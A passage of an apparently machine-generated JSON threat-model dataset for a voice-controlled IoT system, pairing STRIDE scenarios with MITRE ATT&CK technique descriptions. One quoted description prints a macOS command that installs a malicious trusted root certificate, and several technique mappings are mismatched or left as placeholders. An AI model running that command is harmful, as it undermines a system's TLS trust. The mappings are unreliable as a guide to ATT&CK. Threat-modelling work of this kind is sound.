                    "Assumption": "Data in transit is not protected by encryption.",
                    "Role": "Network Engineer",
                    "Condition": "Using plaintext communication."
                },
                {
                    "Assumption": "Attacker can perform man-in-the-middle attacks.",
                    "Role": "Security Analyst",
                    "Condition": "No SSL/TLS in place."
                },
                {
                    "Assumption": "Server-side data validation is poor.",
                    "Role": "System Architect",
                    "Condition": "Inadequate data integrity checks."
                }
            ],
            "Potential Impact": "Corruption or alteration of responses and actions.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "man-in-the-middle",
                "response modification"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Physical tampering with IoT devices to alter their functions.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are publicly accessible.",
                    "Role": "Physical Security Officer",
                    "Condition": "Devices placed in unprotected locations."
                },
                {
                    "Assumption": "Devices lack physical-breach detection mechanisms.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "No tampering detection sensors."
                },
                {
                    "Assumption": "No regular physical inspection of devices.",
                    "Role": "Maintenance Team",
                    "Condition": "Infrequent or absent checks."
                }
            ],
            "Potential Impact": "Unauthorized physical manipulation and data invalidation.",
            "MITRE ATT&CK Keywords": [
                "physical access",
                "device manipulation",
                "function alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies sending voice commands leading to unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "System lacks detailed logging for voice commands.",
                    "Role": "Application Developer",
                    "Condition": "No reliable audit trails."
                },
                {
                    "Assumption": "Voice commands are not tied to user identity robustly.",
                    "Role": "Authentication Engineer",
                    "Condition": "Poor or absent user verification."
                },
                {
                    "Assumption": "Logs are not tamper-evident.",
                    "Role": "Security Analyst",
                    "Condition": "Weak log protections."
                }
            ],
            "Potential Impact": "Difficulty in tracing unauthorized actions and accountability.",
            "MITRE ATT&CK Keywords": [
                "voice command denial",
                "audit trail absence",
                "action repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrator denies making changes to IoT controller settings.",
            "Assumptions": [
                {
                    "Assumption": "No logging of administrative actions.",
                    "Role": "System Administrator",
                    "Condition": "Logs not enabled or incomplete."
                },
                {
                    "Assumption": "Logs can be altered without detection.",
                    "Role": "Security Engineer",
                    "Condition": "Weak integrity checks on logs."
                },
                {
                    "Assumption": "No multi-factor authentication for critical settings.",
                    "Role": "Security Architect",
                    "Condition": "Single-layer authentication used."
                }
            ],
            "Potential Impact": "Untraceable modifications and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "administrative action denial",
                "log tampering",
                "settings repudiation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services being misused with user denying associated actions.",
            "Assumptions": [
                {
                    "Assumption": "Cloud interactions not fully logged.",
                    "Role": "Cloud Service Manager",
                    "Condition": "Deficient logging policy."
                },
                {
                    "Assumption": "Logs are accessible by unauthorized users.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access controls on logs."
                },
                {
                    "Assumption": "Activity logs can be deleted or modified.",
                    "Role": "Security Analyst",
                    "Condition": "No immutability on logs."
                }
            ],
            "Potential Impact": "Data misuse and operational discrepancies.",
            "MITRE ATT&CK Keywords": [
                "cloud misuse denial",
                "log exposure",
                "log alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on voice command transmissions.",
            "Assumptions": [
                {
                    "Assumption": "Voice data is transmitted in plaintext.",
                    "Role": "Network Engineer",
                    "Condition": "Unsecured transmission protocols."
                },
                {
                    "Assumption": "Lack of encryption on communication channels.",
                    "Role": "Security Architect",
                    "Condition": "Use of non-encrypted channels."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Security Analyst",
                    "Condition": "Insecure or open network access."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive voice commands and potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "voice eavesdropping",
                "data interception",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on cloud services exposed due to misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is stored on the cloud without encryption.",
                    "Role": "Cloud Service Manager",
                    "Condition": "Faulty storage configurations."
                },
                {
                    "Assumption": "Permissions on cloud data are overly permissive.",
                    "Role": "System Administrator",
                    "Condition": "Improper access controls."
                },
                {
                    "Assumption": "Cloud service misconfigurations go undetected.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of monitoring mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data breach.",
            "MITRE ATT&CK Keywords": [
                "cloud data exposure",
                "misconfiguration",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data sent from IoT devices to the cloud services is intercepted.",
            "Assumptions": [
                {
                    "Assumption": "IoT data is transmitted without encryption.",
                    "Role": "IoT System Architect",
                    "Condition": "Using unsecured transfer protocols."
                },
                {
                    "Assumption": "No integrity checks on transmitted data.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of verification protocols."
                },
                {
                    "Assumption": "Network security is insufficient.",
                    "Role": "Network Administrator",
                    "Condition": "Insecure network infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized interception and access to sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "data transmission interception",
                "unencrypted data",
                "IoT data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the server-side application with excessive requests causing a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting mechanisms are in place.",
                    "Role": "System Architect",
                    "Condition": "Absence of rate limiting."
                },
                {
                    "Assumption": "Insufficient server capacity to handle burst traffic.",
                    "Role": "IT Operations Manager",
                    "Condition": "Inadequate server resources."
                },
                {
                    "Assumption": "Attack detection mechanisms are weak.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of proper monitoring."
                }
            ],
            "Potential Impact": "System outage and disrupted service availability.",
            "MITRE ATT&CK Keywords": [
                "request flooding",
                "server overload",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeting the IoT controller with malformed requests to crash it.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller does not validate inputs properly.",
                    "Role": "IoT Developer",
                    "Condition": "Lack of input validation."
                },
                {
                    "Assumption": "No rate limiting on the IoT controller.",
                    "Role": "System Architect",
                    "Condition": "Absence of safeguards."
                },
                {
                    "Assumption": "Attacker can route requests to the IoT controller.",
                    "Role": "Network Engineer",
                    "Condition": "Unprotected network routing."
                }
            ],
            "Potential Impact": "Interruption of IoT device functionality and potential physical impact.",
            "MITRE ATT&CK Keywords": [
                "malformed requests",
                "IoT crash",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading the microphone with noise to prevent legitimate commands from being captured.",
            "Assumptions": [
                {
                    "Assumption": "Microphone has no noise filtering capabilities.",
                    "Role": "System Designer",
                    "Condition": "Lack of advanced filtering."
                },
                {
                    "Assumption": "System cannot distinguish between legitimate and illegitimate noise.",
                    "Role": "Voice Recognition Engineer",
                    "Condition": "Weak signal processing algorithms."
                },
                {
                    "Assumption": "Physical access to the microphone is possible.",
                    "Role": "Security Officer",
                    "Condition": "Microphone placed in a public area."
                }
            ],
            "Potential Impact": "Interruption in command recognition and system usability.",
            "MITRE ATT&CK Keywords": [
                "microphone overload",
                "command disruption",
                "service blockage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains higher privileges through vulnerabilities in the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller firmware has unpatched vulnerabilities.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Delayed firmware updates."
                },
                {
                    "Assumption": "No robust access control mechanisms in place.",
                    "Role": "Security Architect",
                    "Condition": "Poor user privilege management."
                },
                {
                    "Assumption": "Attacker can exploit known vulnerabilities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of proactive vulnerability scanning."
                }
            ],
            "Potential Impact": "Unauthorized access and control over IoT systems.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "firmware vulnerability",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker uses a known vulnerability to gain administrative access to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Server software has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delayed security updates."
                },
                {
                    "Assumption": "Application lacks proper input validation.",
                    "Role": "Application Developer",
                    "Condition": "Weak code review practices."
                },
                {
                    "Assumption": "Insufficient segregation of duties in server management.",
                    "Role": "IT Manager",
                    "Condition": "Single point of failure in privileges."
                }
            ],
            "Potential Impact": "Complete control over server operations and data.",
            "MITRE ATT&CK Keywords": [
                "server access",
                "unauthorized admin",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits a weak authentication mechanism to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Weak or default passwords are used.",
                    "Role": "System Administrator",
                    "Condition": "Poor password management policies."
                },
                {
                    "Assumption": "No multi-factor authentication enabled.",
                    "Role": "Security Architect",
                    "Condition": "Single-layer authentication."
                },
                {
                    "Assumption": "Insufficient access control monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of activity monitoring."
                }
            ],
            "Potential Impact": "Gain unauthorized higher-level access leading to system manipulation.",
            "MITRE ATT&CK Keywords": [
                "weak authentication",
                "password exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user by manipulating the microphone inputs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the microphone or can intercept its signals.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity or signal interception capability"
                },
                {
                    "Assumption": "The system lacks robust authentication to verify the legitimacy of voice commands.",
                    "Role": "System Designer",
                    "Condition": "Weak or nonexistent voice authentication mechanisms"
                },
                {
                    "Assumption": "The attacker has knowledge of the user's voice and typical commands.",
                    "Role": "Attacker",
                    "Condition": "Prior reconnaissance or social engineering"
                }
            ],
            "Potential Impact": "Unauthorized command execution leading to compromised system integrity and possible information leakage.",
            "MITRE ATT&CK Keywords": [
                "Masquerading",
                "Impersonation",
                "Voice Spoofing",
                "Authentication Bypass"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the server-side application by using stolen credentials.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are compromised due to phishing or other social engineering attacks.",
                    "Role": "Attacker",
                    "Condition": "Successful phishing or social engineering"
                },
                {
                    "Assumption": "The server does not employ multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Lack of multi-factor authentication"
                },
                {
                    "Assumption": "User credentials are not regularly updated or monitored.",
                    "Role": "User",
                    "Condition": "Poor credential management"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system functions, compromising data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "Credential Theft",
                "Identity Theft",
                "Unauthorized Access",
                "Phishing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake client-side application to intercept and manipulate voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can distribute the fake application to users.",
                    "Role": "Attacker",
                    "Condition": "Ability to deceive users into downloading the fake app"
                },
                {
                    "Assumption": "Users are not able to distinguish the fake application from the legitimate one.",
                    "Role": "User",
                    "Condition": "Lack of awareness or vigilance"
                },
                {
                    "Assumption": "The system does not verify the origin and integrity of client-side applications.",
                    "Role": "System Designer",
                    "Condition": "Weak application integrity checks"
                }
            ],
            "Potential Impact": "Manipulated or intercepted commands can lead to unauthorized actions and data breaches.",
            "MITRE ATT&CK Keywords": [
                "Application Spoofing",
                "Man-in-the-Middle",
                "Remote Access",
                "Injection"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts communication between the client-side application and the server to alter commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network monitoring capabilities"
                },
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "The system does not perform integrity checks on received commands.",
                    "Role": "System Designer",
                    "Condition": "Weak validation mechanisms"
                }
            ],
            "Potential Impact": "Altered commands can cause unauthorized actions and compromise system integrity.",
            "MITRE ATT&CK Keywords": [
                "Network Sniffing",
                "Traffic Manipulation",
                "Command Injection",
                "Data Tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the IoT Controller and modifies the control logic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the IoT Controller physically or remotely.",
                    "Role": "Attacker",
                    "Condition": "Physical access or weak remote access controls"
                },
                {
                    "Assumption": "The IoT Controller firmware is not properly secured.",
                    "Role": "System Designer",
                    "Condition": "Outdated or unprotected firmware"
                },
                {
                    "Assumption": "System updates and patches are not regularly applied.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate update and patch management"
                }
            ],
            "Potential Impact": "Modified control logic can result in unsafe or unintended device actions, compromising data integrity and system availability.",
            "MITRE ATT&CK Keywords": [
                "Firmware Modification",
                "Control Logic Tampering",
                "Device Control",
                "Remote Access"
            ],
            "mitre_technique": {
                "name": "Automated Collection",
